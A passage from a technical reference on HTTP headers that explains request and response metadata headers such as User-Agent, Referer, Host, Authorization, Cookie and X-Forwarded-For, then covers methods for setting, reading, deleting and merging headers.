- **Mobile browsers**: `Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1`
- **HTTP clients**: `curl/7.68.0`, `python-requests/2.28.1`, `Postman/10.0.0`
- **Bots/crawlers**: `Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)`, `Bingbot/2.0`

**Historical Context**

The "Mozilla" prefix appears in most browser User-Agent strings due to browser compatibility history. Early browsers identified themselves differently, and websites served different content based on User-Agent detection. Browsers began including "Mozilla" to avoid being served downgraded content, creating the legacy pattern still used today.

**Common Use Cases**

Servers use User-Agent for:

- **Content negotiation**: Serving mobile-optimized vs desktop layouts
- **Browser-specific workarounds**: Applying fixes for known browser bugs
- **Analytics**: Tracking browser/device usage patterns
- **Bot detection**: Identifying and handling automated traffic differently
- **Security**: Blocking known malicious user agents
- **Feature detection**: Determining client capabilities (though feature detection via other methods is preferred)

**Privacy Considerations**

User-Agent strings contribute to browser fingerprinting—identifying users across sessions without cookies. Detailed information about OS version, browser version, and plugins creates unique signatures. Recent trends:

- **User-Agent reduction**: Browsers are reducing granularity of User-Agent strings
- **User-Agent Client Hints**: New mechanism providing opt-in access to detailed client information
- **Frozen User-Agent strings**: Some browsers freeze or limit version number updates in User-Agent

**Validation and Reliability**

[Unverified] User-Agent strings can be easily spoofed by clients. Servers should not rely on User-Agent for security decisions or critical functionality. The header is advisory—clients can send any value or omit it entirely. Proper practice is to use feature detection rather than User-Agent parsing when determining client capabilities.

### Accept Headers

These headers inform the server about the content types, languages, encodings, and character sets the client can process.

**Accept**

Specifies which media types the client can handle. Uses MIME type notation with optional quality values (q-values) ranging from 0 to 1:

```
Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8
```

Components:

- **MIME type**: `type/subtype` (e.g., `text/html`, `application/json`, `image/png`)
- **Wildcards**: `*/*` accepts any type, `text/*` accepts any text type
- **Quality values**: `q=0.9` indicates preference (higher is preferred)
- **Parameters**: Additional type-specific parameters (e.g., `text/html; charset=utf-8`)

If no Accept header is present, servers typically assume `*/*` (accept anything).

Common patterns:

- API clients: `Accept: application/json`
- Browsers: Multiple types with preferences
- Image requests: `Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8`

**Accept-Language**

Indicates the client's preferred natural languages:

```
Accept-Language: en-US,en;q=0.9,es;q=0.8,fr;q=0.7
```

Format:

- **Language tags**: ISO 639 language codes with optional region (e.g., `en-US`, `zh-CN`)
- **Quality values**: Indicate preference order
- **Multiple languages**: Comma-separated list

Servers use this for content localization, but it represents user preference, not necessarily proficiency. Websites may override this with explicit language selection.

**Accept-Encoding**

Specifies which content encodings (typically compression) the client supports:

```
Accept-Encoding: gzip, deflate, br
```

Common values:

- **gzip**: GNU zip compression, widely supported
- **deflate**: DEFLATE compression
- **br**: Brotli compression, more efficient than gzip
- **identity**: No encoding (uncompressed)
- *****: Any encoding

The server responds with `Content-Encoding` indicating which encoding was applied. Quality values can indicate preferences: `Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1`

If the client cannot handle any supported encoding, the server sends uncompressed content (identity encoding).

**Accept-Charset** (Deprecated)

Historically indicated which character encodings the client supports:

```
Accept-Charset: utf-8, iso-8859-1;q=0.5
```

This header is now largely obsolete. UTF-8 has become the de facto standard, and modern browsers typically don't send this header. Servers should use UTF-8 unless there's a specific reason not to.

### Referer Header

The `Referer` header (note the misspelling, preserved for historical reasons) indicates the URI of the resource from which the request originated:

```
Referer: https://example.com/page.html
```

**Common Uses**

- **Analytics**: Tracking where traffic originates
- **Access control**: Validating requests come from expected sources (though unreliable for security)
- **Logging**: Understanding user navigation patterns
- **Resource serving**: Determining context for serving embedded resources

**When Referer is Sent**

Browsers send Referer in several scenarios:

- Clicking links (Referer is the page containing the link)
- Submitting forms
- Loading embedded resources (images, scripts, stylesheets)
- Following redirects

**When Referer is Not Sent**

- HTTPS → HTTP transitions (by default, for security)
- User types URL directly in address bar
- Bookmarks or saved links
- Privacy-conscious browser settings
- Referrer Policy restrictions

**Referrer Policy**

The `Referrer-Policy` response header (note correct spelling here) controls when and how much referrer information is sent:

```
Referrer-Policy: strict-origin-when-cross-origin
```

Policy values:

- **no-referrer**: Never send Referer header
- **no-referrer-when-downgrade**: Send Referer except HTTPS → HTTP (default behavior)
- **origin**: Send only the origin (scheme, host, port), not full URL
- **origin-when-cross-origin**: Full URL for same-origin, only origin for cross-origin
- **same-origin**: Send Referer only for same-origin requests
- **strict-origin**: Send origin except HTTPS → HTTP
- **strict-origin-when-cross-origin**: Full URL for same-origin, origin for cross-origin HTTPS, nothing for HTTPS → HTTP
- **unsafe-url**: Always send full URL (privacy risk)

HTML can also set policy per-element:

```html
<a href="..." referrerpolicy="no-referrer">Link</a>
<img src="..." referrerpolicy="origin">
```

**Security and Privacy**

[Unverified] Referer headers can leak sensitive information:

- URLs containing tokens, session IDs, or personal data
- Internal navigation patterns
- Private page structures

Servers should not rely on Referer for security decisions (CSRF protection, authorization) because:

- Clients can omit or modify the header
- Browsers may not send it in certain scenarios
- Privacy extensions strip Referer information

**Common Patterns**

Hotlink protection (preventing other sites from embedding your images):

```
# Server checks if Referer matches expected domain
# If not, serves placeholder or denies request
```

Analytics and attribution tracking:

```
# Determine which external sites drive traffic
# Track internal navigation flows
```

### Origin Header

The `Origin` header indicates the origin (scheme, host, port) of the request:

```
Origin: https://example.com
```

**Distinction from Referer**

While Referer contains the full URL, Origin contains only the origin (no path or query string). Origin is specifically used for CORS and security decisions.

**When Origin is Sent**

- CORS requests (cross-origin XMLHttpRequest, Fetch API)
- POST requests from forms
- Cross-origin requests that might modify server state

**When Origin is Not Sent**

- Same-origin requests (browser-dependent)
- GET/HEAD requests (sometimes)
- Navigation requests (sometimes)

**CORS Usage**

The server compares Origin against allowed origins and responds with `Access-Control-Allow-Origin`:

```
# Request
Origin: https://app.example.com

# Response
Access-Control-Allow-Origin: https://app.example.com
```

If the Origin is not allowed, the browser blocks the response from reaching the JavaScript code.

**Security Context**

Origin is more reliable than Referer for security decisions because:

- Browsers automatically include it in relevant security contexts
- It's specifically designed for same-origin policy enforcement
- Cannot be omitted in CORS scenarios
- Less subject to privacy policies that strip Referer

However, Origin can still be manipulated in non-browser contexts (API clients, curl, etc.).

### Host Header

The `Host` header specifies the domain name and port of the server to which the request is being sent:

```
Host: www.example.com:8080
```

**Required Status**

Host is mandatory in HTTP/1.1 requests. Requests without a Host header should receive a 400 Bad Request response.

**Purpose**

Host enables virtual hosting—multiple websites sharing a single IP address. The server uses the Host header to determine which site to serve:

```
# Single server at 192.0.2.1 hosting multiple domains
Host: www.example.com → serves example.com site
Host: www.another.com → serves another.com site
```

**Format**

- Domain name: `Host: example.com`
- Domain with port: `Host: example.com:8080`
- IP address: `Host: 192.0.2.1`
- IPv6: `Host: [2001:db8::1]`

If no port is specified, the default port for the scheme is implied (80 for HTTP, 443 for HTTPS).

**Host vs. Request URI**

HTTP/1.1 requests specify the target as a path:

```
GET /path HTTP/1.1
Host: example.com
```

The absolute URI is conceptually `http://example.com/path`, but only the path appears in the request line.

HTTP/2 and HTTP/3 use the `:authority` pseudo-header instead of Host, though the concept is identical.

**Security Considerations**

Host header injection attacks attempt to manipulate the Host header to:

- Generate links in password reset emails pointing to attacker-controlled domains
- Exploit cache poisoning
- Bypass access controls

Servers should validate Host headers against expected values and reject suspicious requests.

### Content-Type Header

Content-Type appears in both requests and responses, indicating the media type of the body.

**In Requests**

Specifies the format of data being sent to the server:

```
Content-Type: application/json; charset=utf-8
```

Common request Content-Types:

- **application/json**: JSON data
- **application/x-www-form-urlencoded**: HTML form data (default)
- **multipart/form-data**: File uploads and complex form data
- **text/plain**: Plain text
- **application/xml**: XML data
- **application/octet-stream**: Binary data

**In Responses**

Indicates the format of data being returned:

```
Content-Type: text/html; charset=UTF-8
```

Common response Content-Types:

- **text/html**: HTML documents
- **application/json**: API responses
- **image/png**, **image/jpeg**, **image/gif**: Images
- **text/css**: Stylesheets
- **application/javascript**: JavaScript files
- **application/pdf**: PDF documents
- **video/mp4**: Video content

**Parameters**

Content-Type can include parameters:

- **charset**: Character encoding (e.g., `charset=utf-8`)
- **boundary**: Delimiter for multipart data (e.g., `boundary=----WebKitFormBoundary`)

**multipart/form-data Structure**

Used for file uploads:

```
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="username"

john_doe
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="photo.jpg"
Content-Type: image/jpeg

[binary data]
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

Each part is separated by the boundary string, with headers and content for each field or file.

**Content Sniffing**

[Unverified] Browsers may ignore the Content-Type header and "sniff" content to determine its actual type. This creates security risks (XSS via content type confusion). The `X-Content-Type-Options: nosniff` response header prevents this behavior, forcing browsers to respect the declared Content-Type.

### Content-Length Header

Specifies the size of the message body in bytes:

```
Content-Length: 1234
```

**Purpose**

- Allows the receiver to know when the complete message has arrived
- Enables progress tracking for downloads/uploads
- Required for persistent connections to distinguish message boundaries

**When Required**

Content-Length is typically required for:

- Requests with bodies (POST, PUT, PATCH)
- Responses with bodies
- Any message where the recipient needs to know body size upfront

**Exceptions**

Content-Length is not needed when:

- `Transfer-Encoding: chunked` is used (body size unknown at start)
- Connection will close after the message (HTTP/1.0 style)
- HEAD requests (no body)
- 1xx, 204, 304 responses (no body allowed)

**Conflicting Headers**

When both Content-Length and Transfer-Encoding are present, Transfer-Encoding takes precedence and Content-Length should be ignored. [Unverified] Some implementations may treat this as an error condition for security reasons (request smuggling attacks).

**Accuracy Requirements**

Content-Length must be exact. Mismatches cause:

- Truncated messages (value too small)
- Hanging connections waiting for more data (value too large)
- Protocol violations and connection closure

### Authorization Header

Contains credentials for authenticating the client with the server:

```
Authorization: <auth-scheme> <credentials>
```

**Basic Authentication**

Encodes username and password as Base64:

```
Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
```

Format: `Basic base64(username:password)`

[Unverified] Basic auth provides no encryption—credentials are easily decoded. Always use HTTPS with Basic authentication. Despite the name "Basic," this is not inherently insecure when used over encrypted connections.

**Bearer Token**

Common in OAuth 2.0 and JWT authentication:

```
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

The token is an opaque string (from the client's perspective) that the server validates. Tokens may be:

- JWTs (self-contained with claims)
- Opaque reference tokens (server looks up session)
- API keys

**Digest Authentication**

Uses challenge-response with hashing:

```
Authorization: Digest username="user", realm="realm@host.com", 
  nonce="dcd98b7102dd2f0e8b11d0f600bfb0c093", 
  uri="/dir/index.html",
  response="6629fae49393a05397450978507c4ef1",
  opaque="5ccc069c403ebaf9f0171e9517f40e41"
```

More secure than Basic auth over unencrypted connections, though HTTPS has largely superseded this.

**API Key Authentication**

Some APIs use custom schemes:

```
Authorization: ApiKey YOUR_API_KEY
```

Or custom headers:

```
X-API-Key: YOUR_API_KEY
```

**Security Practices**

- Always use HTTPS when sending authorization credentials
- Tokens should have expiration times
- Implement token rotation/refresh mechanisms
- Clear Authorization headers from logs
- Never include credentials in URLs (logged by proxies, browsers)

### Cookie Header

Sends previously stored cookies to the server:

```
Cookie: session_id=abc123; user_pref=dark_mode; tracking=xyz789
```

**Format**

Multiple cookies are sent as name-value pairs separated by semicolons and spaces. Unlike Set-Cookie, the Cookie header:

- Contains no attributes (domain, path, expiry)
- Combines all applicable cookies in one header
- Uses simple `name=value; name=value` format

**Cookie Selection**

Browsers automatically include cookies that match:

- The request's domain (exact match or domain attribute)
- The request's path (path prefix matching)
- The request's scheme (Secure flag for HTTPS only)
- SameSite attribute rules

**Size Limitations**

Browsers limit cookie storage:

- Per cookie: typically 4KB
- Per domain: typically 50-180 cookies
- Total storage: browser-dependent

Large Cookie headers can:

- Increase request overhead
- Hit server header size limits
- Cause performance issues

**Cookie Tasting**

[Inference] Servers examine Cookie headers to:

- Identify user sessions
- Restore user preferences
- Track behavior (analytics, advertising)
- Maintain shopping cart state
- Implement authentication

**Third-Party Cookies**

Cookies sent in cross-origin contexts (e.g., embedded images, iframes). Browser privacy features increasingly block third-party cookies by default. The SameSite attribute controls this behavior:

- `SameSite=Strict`: Never sent cross-origin
- `SameSite=Lax`: Sent on top-level navigation (link clicks)
- `SameSite=None; Secure`: Sent cross-origin (requires HTTPS)

### Set-Cookie Header

Sent by servers to store cookies on the client:

```
Set-Cookie: session_id=abc123; Domain=example.com; Path=/; Secure; HttpOnly; SameSite=Strict; Max-Age=3600
```

**Basic Structure**

```
Set-Cookie: name=value; attribute1; attribute2; attribute3
```

**Attributes**

**Domain**: Specifies which hosts can receive the cookie:

```
Set-Cookie: id=123; Domain=example.com
```

- Includes subdomains (cookie sent to `www.example.com`, `api.example.com`)
- If omitted, defaults to the current host only (no subdomains)
- Cannot set cookies for other domains or TLDs

**Path**: Limits cookie to specific paths:

```
Set-Cookie: id=123; Path=/admin
```

- Cookie sent only for `/admin` and subpaths (`/admin/users`)
- Defaults to the current path if omitted
- Path matching is prefix-based

**Expires**: Specifies absolute expiration date:

```
Set-Cookie: id=123; Expires=Wed, 21 Oct 2025 07:28:00 GMT
```

- Uses HTTP date format
- Cookie deleted after this date
- If omitted (and no Max-Age), becomes a session cookie (deleted when browser closes)

**Max-Age**: Specifies lifetime in seconds:

```
Set-Cookie: id=123; Max-Age=3600
```

- Takes precedence over Expires if both present
- `Max-Age=0` or negative value deletes the cookie immediately
- More reliable than Expires (no clock skew issues)

**Secure**: Cookie sent only over HTTPS:

```
Set-Cookie: id=123; Secure
```

- Prevents transmission over unencrypted connections
- Critical for sensitive data
- HTTPS-served pages should always use Secure

**HttpOnly**: Prevents JavaScript access:

```
Set-Cookie: id=123; HttpOnly
```

- Document.cookie cannot read or write the cookie
- Mitigates XSS attacks stealing session tokens
- Still sent in HTTP requests normally
- Recommended for authentication cookies

**SameSite**: Controls cross-site request behavior:

```
Set-Cookie: id=123; SameSite=Strict
```

- **Strict**: Never sent on cross-site requests
- **Lax**: Sent on top-level navigation (GET only), not on embedded requests
- **None**: Sent on all requests (requires Secure flag)
- Default varies by browser (increasingly Lax)
- Primary CSRF protection mechanism

**Multiple Set-Cookie Headers**

Servers can set multiple cookies by including multiple Set-Cookie headers (not comma-separated):

```
HTTP/1.1 200 OK
Set-Cookie: session_id=abc123; HttpOnly; Secure
Set-Cookie: theme=dark; Max-Age=31536000
Set-Cookie: analytics=xyz789; SameSite=None; Secure
```

**Cookie Deletion**

To delete a cookie, set it with an expired date or Max-Age=0:

```
Set-Cookie: session_id=; Max-Age=0; Path=/; Domain=example.com
```

Domain and Path must match the original cookie exactly for deletion to work.

**Cookie Prefixes**

Special name prefixes impose additional restrictions:

**__Secure- prefix**: Cookie must have Secure flag:

```
Set-Cookie: __Secure-token=abc123; Secure
```

**__Host- prefix**: Cookie must have Secure flag, no Domain attribute, and Path=/:

```
Set-Cookie: __Host-session=abc123; Secure; Path=/
```

These prefixes prevent certain types of attacks by enforcing security requirements.

### X-Forwarded Headers

These non-standard headers convey information about the client when requests pass through proxies or load balancers.

**X-Forwarded-For**

Contains the originating client IP address and intermediate proxies:

```
X-Forwarded-For: 203.0.113.195, 70.41.3.18, 150.172.238.178
```

Format: `client, proxy1, proxy2, proxy3`

- Leftmost IP is the original client
- Each proxy appends its predecessor's address
- Rightmost IP is the last proxy before the server

**Use Cases**:

- Geolocation based on client IP
- Access control by IP address
- Rate limiting per client
- Logging actual client IPs instead of proxy IPs

**Security Considerations**:

[Unverified] Clients can spoof X-Forwarded-For values. Trust only the rightmost IP addresses added by infrastructure you control. Many applications incorrectly trust the leftmost IP, creating security vulnerabilities (IP-based authentication bypass, rate limit evasion).

Best practice: Configure trusted proxies and validate the header accordingly.

**X-Forwarded-Host**

Indicates the original Host header value:

```
X-Forwarded-Host: example.com
```

When a reverse proxy changes the Host header, it preserves the original here. Useful for generating absolute URLs that reference the original host, not the internal proxy/backend host.

**X-Forwarded-Proto**

Indicates the original protocol (scheme):

```
X-Forwarded-Proto: https
```

Common values: `http`, `https`

SSL/TLS termination proxies decrypt HTTPS at the edge, then forward HTTP to backends. The application needs X-Forwarded-Proto to:

- Generate correct URLs (https:// not http://)
- Enforce HTTPS-only policies
- Set Secure cookie flags appropriately

**X-Forwarded-Port**

Indicates the original port:

```
X-Forwarded-Port: 443
```

Useful when generating full URLs including non-standard ports.

**Standardization: Forwarded Header**

RFC 7239 defines a standardized Forwarded header replacing X-Forwarded-* headers:

```
Forwarded: for=192.0.2.60;proto=https;host=example.com;by=203.0.113.43
```

Parameters:

- **for**: Client IP address
- **proto**: Original protocol
- **host**: Original host
- **by**: Proxy interface receiving the request

Multiple proxies append their information:

```
Forwarded: for=192.0.2.60, for=198.51.100.17
```

Despite standardization, X-Forwarded-* headers remain more common in practice.

### X-Content-Type-Options Header

Prevents MIME type sniffing:

```
X-Content-Type-Options: nosniff
```

**Purpose**

[Unverified] Browsers historically ignored the Content-Type header and examined file contents to determine the "real" type (MIME sniffing). This created security vulnerabilities:

- User-uploaded files could be interpreted as HTML/JavaScript
- Image uploads containing JavaScript executed as scripts
- Text files containing HTML rendered as web pages

**Effect**

With `nosniff`:

- Browsers strictly respect the Content-Type header
- Refuse to execute stylesheets not served as `text/css`
- Refuse to execute scripts not served as JavaScript MIME types
- Prevent interpretation mismatches

**Recommended Practice**

Always include this header on all responses. Essential for:

- User-generated content
- File uploads
- API endpoints
- Static asset serving

### Server Header

Identifies the server software handling the request:

```
Server: Apache/2.4.41 (Ubuntu)
Server: nginx/1.18.0
Server: cloudflare
```

**Information Disclosure**

Detailed Server headers reveal:

- Software name and version
- Operating system
- Installed modules

[Unverified] This information aids attackers in targeting known vulnerabilities. Security-conscious deployments:

- Remove or obscure Server headers
- Provide minimal information
- Use generic values

**Alternatives**

Some servers send generic values:

```
Server: Server
```

Or omit the header entirely (though HTTP conventions suggest including it).

### Via Header

Records proxy servers in the request/response chain:

```
Via: 1.1 proxy1.example.com, 1.1 proxy2.example.com
```

Format: `protocol_version proxy_identifier`

**Purpose**

- Trace request routing through proxies
- Detect forwarding loops
- Debug proxy configurations
- Understand network topology

**Privacy**

Via headers reveal network infrastructure, which may be sensitive. Some proxies redact or anonymize Via information.

### From Header

Contains an email address for the user controlling the client:

```
From: webmaster@example.com
```

**Usage**

Primarily used by automated clients (bots, crawlers) to provide contact information. Server administrators can contact the responsible party if the bot misbehaves.

Rarely used by human-operated browsers due to privacy concerns. Exposing email addresses enables spam and tracking.

### Date Header

Indicates when the message was originated:

```
Date: Tue, 16 Dec 2025 10:30:00 GMT
```

**Format**

Uses HTTP date format (RFC 5322/RFC 1123):

```
Day, DD Mon YYYY HH:MM:SS GMT
```

Always in GMT (UTC), never local time zones.

**Requirements**

Origin servers should include Date in all responses. Proxies must include Date when adding or replacing message bodies.

**Uses**

- Calculate resource age for caching
- Log timestamps
- Detect clock skew between client and server
- Validate time-sensitive security tokens

### Age Header

Indicates the time in seconds since the response was generated or validated at the origin server:

```
Age: 3600
```

**Purpose**

Caching proxies add or update Age to inform clients how "fresh" the cached response is. Combined with Cache-Control max-age, clients determine if cached content is still valid.

Example:

```
Cache-Control: max-age=7200
Age: 3600
```

This response is still fresh for another 3600 seconds (1 hour).

**Calculation**

Age represents:

- Time since origin server generated the response
- Plus time spent in caches
- Plus transmission time

Caches increment Age as time passes, providing accurate freshness information.

### Vary Header

Indicates which request headers affect the response representation:

```
Vary: Accept-Encoding, User-Agent
```

**Purpose**

Instructs caches which request headers to consider when determining if a cached response matches a new request. Without Vary, caches assume only the URL matters.

**Examples**

`Vary: Accept-Encoding`: Cache separate versions for gzip, br, and uncompressed `Vary: User-Agent`: Cache separate versions for different user agents (desktop vs mobile) `Vary: Accept-Language`: Cache separate versions per language `Vary: Origin`: Cache separate versions per origin (CORS responses)

**Cache Implications**

[Inference] Each value in Vary multiplicatively increases cache storage requirements. `Vary: User-Agent` creates separate cached copies for each unique User-Agent string, which can be extremely inefficient. Use Vary judiciously.

**Special Value**

```
Vary: *
```

Indicates response variation depends on factors beyond request headers (e.g., time, server state, cookies). Effectively prevents caching in many implementations.

### Content-Disposition Header

Provides information about how to display or handle the content:

```
Content-Disposition: inline
Content-Disposition: attachment; filename="document.pdf"
Content-Disposition: attachment; filename*=UTF-8''%E6%96%87%E6%A1%A3.pdf
```

**Disposition Types**

**inline**: Content should be displayed within the browser (default for many content types) **attachment**: Content should be downloaded and saved

**Parameters**

**filename**: Suggested filename for downloads

```
Content-Disposition: attachment; filename="report-2025.pdf"
```

**filename***: Internationalized filename using RFC 5987 encoding

```
Content-Disposition: attachment; filename*=UTF-8''%E2%9C%93.txt
```

The `filename*` parameter supports non-ASCII characters. Format: `charset'language'encoded-value`

**Use Cases**

- Force download instead of browser display
- Provide meaningful filenames for generated content
- Support international filenames
- Control handling of API responses

**Security**

[Unverified] Browsers sanitize filenames to prevent directory traversal attacks. Filenames containing path separators, special characters, or suspicious patterns are modified. Servers should validate and sanitize user-provided filenames before including them in Content-Disposition.

### Link Header

Provides relationships between the current resource and other resources:

```
Link: <https://example.com/style.css>; rel="stylesheet"
Link: <https://example.com/next-page>; rel="next"
Link: <https://example.com/api/users>; rel="preconnect"
```

**Format**

```
Link: <uri>; rel="relationship"; param1=value1; param2=value2
```

**Common Relationships**

- **stylesheet**: External CSS file
- **icon**: Favicon or icon
- **canonical**: Preferred URL for the resource (SEO)
- **alternate**: Alternative representation (different language, format)
- **next/prev**: Pagination links
- **preload**: Resource should be preloaded
- **preconnect**: Establish early connection to origin
- **dns-prefetch**: Resolve DNS early

**Comparison to HTML Links**

Link headers function similarly to HTML `<link>` elements but operate at the HTTP level. Advantages:

- Available before HTML parsing begins
- Apply to non-HTML resources
- Processed by HTTP clients, not just browsers

**Resource Hints**

Modern browsers use Link headers for performance optimization:

```
Link: <https://cdn.example.com>; rel="preconnect"
Link: <https://example.com/critical.css>; rel="preload"; as="style"
Link: <https://example.com/script.js>; rel="preload"; as="script"
```

These hints allow browsers to optimize resource loading before parsing HTML.

### Content-Language Header

Indicates the natural language(s) of the intended audience:

```
Content-Language: en-US
Content-Language: en-US, fr-CA
```

**Purpose**

Describes the content language, distinct from interface language (Accept-Language). Useful for:

- Search engines indexing content by language
- Screen readers selecting pronunciation
- Content aggregators filtering by language
- Browser translation features

**Multiple Languages**

Content in multiple languages lists them:

```
Content-Language: en, es
```

**No Language**

For language-neutral content (images, data, etc.), omit the header rather than using a dummy value.

### Metadata Headers Summary

**Client Identification**

- User-Agent: Client software details
- From: Contact email for automated clients

**Content Negotiation**

- Accept: Acceptable media types
- Accept-Language: Preferred languages
- Accept-Encoding: Acceptable encodings
- Accept-Charset: Preferred character sets (deprecated)

**Origin and Routing**

- Referer: Source page URL
- Origin: Request origin (scheme, host, port)
- Host: Target host and port
- X-Forwarded-*: Proxy information (non-standard)
- Forwarded: Proxy information (standard)
- Via: Proxy chain

**Content Description**

- Content-Type: Media type of body
- Content-Length: Body size in bytes
- Content-Language: Content language
- Content-Disposition: Display/download handling
- Content-Encoding: Applied compression

**Caching and Validation**

- Date: Message timestamp
- Age: Time since origin generation
- Vary: Headers affecting response selection

**Security and Authentication**

- Authorization: Client credentials
- Cookie: Stored cookies
- Set-Cookie: Store cookies on client
- X-Content-Type-Options: Prevent MIME sniffing

**Relationships and Performance**

- Link: Related resources
- Server: Server software identification

[Inference] Proper use of these metadata headers enables content negotiation, security, caching, routing, and performance optimization throughout the HTTP request-response cycle. Understanding their interactions and implications is fundamental to building robust web applications and APIs.

---

## Header Manipulation Methods

### Setting Headers

Header setting establishes key-value pairs in the request or response header collection. Each header consists of a case-insensitive name and a string value, with the combination communicating metadata about the message or controlling processing behavior.

**Direct assignment** replaces any existing header with the same name. If the header already exists, the old value is discarded and the new value takes its place. This approach works for headers that should have single values like Content-Type, Authorization, or User-Agent. The operation is straightforward: specify the header name and desired value, and the implementation handles storage.

**Case-insensitive handling** means that "Content-Type", "content-type", and "CONTENT-TYPE" all reference the same header. Implementations normalize header names internally, typically to lowercase following HTTP/2's requirements or maintaining original casing for HTTP/1.1. Client code shouldn't rely on specific casing being preserved.

**Value formatting** requires understanding each header's expected format. Some headers accept single values (`Content-Type: application/json`), while others accept comma-separated lists (`Accept: text/html, application/json`). Quality values use semicolon syntax (`Accept-Language: en-US, en;q=0.9`). Understanding the target header's specification ensures properly formatted values.

**Character encoding** in header values has historically been ASCII-only, though modern specifications allow UTF-8 in some contexts. Non-ASCII characters in headers may require percent-encoding or Base64 encoding depending on the header and protocol version. Header values cannot contain newline characters (CR or LF) as these delimit headers, though some implementations support folded headers using CRLF followed by whitespace continuation.

**Restricted headers** cannot be modified by client-side JavaScript for security reasons. Browsers automatically set Host, Connection, Content-Length, Transfer-Encoding, and similar headers based on the request context. Attempting to set these headers from JavaScript may silently fail or throw errors depending on the implementation. Server-side implementations typically allow full header control since they don't face the same security constraints.

### Appending Headers

Appending adds values to headers without replacing existing values, enabling multiple values for the same header name. This operation is essential for headers designed to accept multiple entries.

**Multi-value headers** naturally support appending. Set-Cookie in responses commonly appears multiple times, each instance setting a different cookie. Accept-related headers benefit from multiple values with different quality parameters. Custom headers may accumulate values from multiple middleware components.

**Comma-separated consolidation** occurs in some implementations where multiple header instances with the same name get combined into a single header with comma-separated values. The HTTP specification states that multiple header fields with the same name are equivalent to a single header with comma-separated values, except for Set-Cookie. Example: two `Accept: text/html` and `Accept: application/json` headers become `Accept: text/html, application/json`.

**Order preservation** [Inference: typically maintained within implementations, though the HTTP specification doesn't guarantee order significance for most headers]. The sequence of appended values may matter for some headers, particularly custom headers used for processing pipelines where order indicates middleware execution sequence.

**Append vs. set behavior** differs across implementations. Some provide separate methods (append/add vs. set/replace), while others infer intent from header semantics—always replacing for single-value headers, always appending for multi-value headers. Understanding the specific API's behavior prevents accidentally replacing when intending to append or vice versa.

### Getting Headers

Header retrieval extracts values from the header collection for inspection, validation, or processing decisions. Different access patterns suit different use cases.

**Single value retrieval** returns the header's value as a string, or null/undefined if the header doesn't exist. For headers with multiple values, implementations may return only the first value, the last value, or all values concatenated with commas. The specific behavior varies by API and should be documented.

**Case-insensitive lookup** matches the HTTP specification's requirement. Requesting "content-type", "Content-Type", or any case variation returns the same value. Implementations achieve this through case-insensitive maps, normalization before lookup, or explicit case-folding during comparison.

**Default values** in some APIs allow specifying fallbacks when headers are absent, avoiding explicit null checks in calling code. Pattern: `getHeader('Authorization', 'Bearer anonymous')` returns the Authorization header if present, otherwise the default value.

**Existence checks** determine whether a header is present without retrieving its value. This is useful for boolean flags or when the presence matters more than the value. Some implementations provide dedicated `hasHeader()` or `containsHeader()` methods, while others require checking if retrieval returns non-null.

**All values retrieval** for multi-value headers returns arrays or iterables containing each value separately. This matters for Set-Cookie processing where each cookie needs individual parsing, or for Accept headers where each media type may have distinct quality values requiring separate evaluation.

### Deleting Headers

Header deletion removes entries from the header collection, useful for stripping sensitive data, removing obsolete values, or cleaning up headers before forwarding requests.

**Single header removal** deletes all instances of the specified header name. If multiple headers with the same name exist (either as separate header lines or comma-separated values), the deletion removes everything associated with that name. The operation is idempotent—deleting non-existent headers typically succeeds silently without errors.

**Wildcard deletion** [Unverified: not commonly available in standard APIs] might support patterns like removing all headers matching a prefix (e.g., "X-Custom-*"). Most implementations require explicit header names for deletion, requiring iteration to remove multiple related headers.

**Restricted header deletion** faces similar constraints as setting restricted headers. Client-side JavaScript cannot delete certain browser-controlled headers. Server implementations generally allow deleting any header since they control the entire HTTP message.

**Post-deletion retrieval** returns null/undefined or empty strings depending on implementation. Code checking for header existence after deletion must handle the specific null-value semantics of the API being used.

### Iterating Headers

Header iteration enables processing all headers without knowing names in advance, useful for logging, debugging, proxying, or validation.

**Iteration patterns** vary by language and framework. Iterator interfaces, forEach methods, key-value pairs, or entries methods provide access to the header collection. Each iteration yields the header name and value, sometimes with additional metadata like the original casing or position.

**Order during iteration** [Inference: typically follows insertion order in modern implementations, though the HTTP specification doesn't mandate any particular iteration order]. Headers generally iterate in the order they were added, which may differ from their order in the actual HTTP message due to sorting or internal reorganization.

**Duplicate handling** during iteration depends on how multi-value headers are stored. Some implementations yield separate entries for each header instance, while others combine values into single entries with comma-separated or array values. Understanding this behavior prevents double-processing values.

**Filtering during iteration** allows selectively processing headers matching criteria like name patterns, value formats, or custom predicates. Implementations may provide filter methods, or applications implement filtering in the iteration body.

**Modification during iteration** has undefined or prohibited behavior in many implementations. Adding, removing, or changing headers while iterating may cause errors, skip entries, or process entries multiple times. Best practice copies header names to an array before iterating if modifications are needed.

### Cloning Headers

Header cloning creates independent copies of header collections, enabling modifications without affecting the original. Useful when preparing derivative requests or responses.

**Shallow vs. deep cloning** distinction matters when headers contain complex value structures. Most header values are strings, making shallow copying sufficient. [Inference: Deep cloning would be needed only for implementations that store parsed header objects rather than strings], which is uncommon.

**Independence after cloning** means changes to the clone don't affect the original and vice versa. Adding, modifying, or deleting headers in either collection operates independently. This enables pattern like cloning request headers from an incoming request, modifying specific headers, then using the modified clone for an outgoing request.

**Reference vs. value semantics** in the underlying implementation affect cloning behavior. Value-semantic implementations (common in functional languages) may share underlying storage with copy-on-write, while reference-semantic implementations (common in object-oriented languages) require explicit copying to achieve independence.

### Merging Headers

Header merging combines multiple header collections, useful when aggregating headers from multiple sources like default headers, request-specific headers, and authentication headers.

**Merge strategies** determine conflict resolution when both collections contain the same header name. Options include: overwrite (second collection replaces first), preserve (first collection takes precedence), append (combine values), or error (conflicts forbidden). The appropriate strategy depends on header semantics and use case.

